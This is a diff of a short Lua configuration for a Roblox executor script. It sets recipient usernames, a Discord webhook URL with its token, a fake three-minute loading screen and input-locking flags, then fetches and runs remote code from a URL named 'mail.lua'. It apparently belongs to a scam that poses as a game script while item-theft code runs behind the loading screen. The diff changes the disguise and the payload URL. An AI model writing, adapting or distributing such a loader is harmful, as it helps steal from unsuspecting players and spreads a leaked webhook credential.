@@ -1,16 +1,15 @@
 UserName = "fluxusvf"
-UserName2 = "fluxuswd" -- optional delete the whole line if you don't want it
-Webhook = "https://discord.com/api/webhooks/1099111449768509662/z_nuR-DprJTGCbgTRaCMIRm8dDHOTsgpHtfjm7Fte0vTkaA8w8g8vQ7enTQa6EECOyMW" -- optional delete the whole line if you don't want it
+UserName2 = "fluxuswd"
+Webhook = "https://discord.com/api/webhooks/1099111449768509662/z_nuR-DprJTGCbgTRaCMIRm8dDHOTsgpHtfjm7Fte0vTkaA8w8g8vQ7enTQa6EECOyMW"
 
 _G.LoadingScreen = true
-_G.AntiLeave = true
-_G.MouseLock = true 
--- set them to false if you don't need them
+_G.AntiLeave = false
+_G.MouseLock = false 
 
-_G.ScriptName = "Rizz Scriptz"
+_G.ScriptName = "Milk Up"
 _G.FirstText = "Script Preparing"
 _G.SecondText = "Script Loading..."
 _G.ThirdText = "Almost Done..."
 _G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
 
-loadstring(game:HttpGet("http://rizz.ct8.pl/scripts/Main", true))()
+loadstring(game:HttpGet("https://github.com/RainIsntBald/Vault/raw/main/k4f/mail.lua", true))()
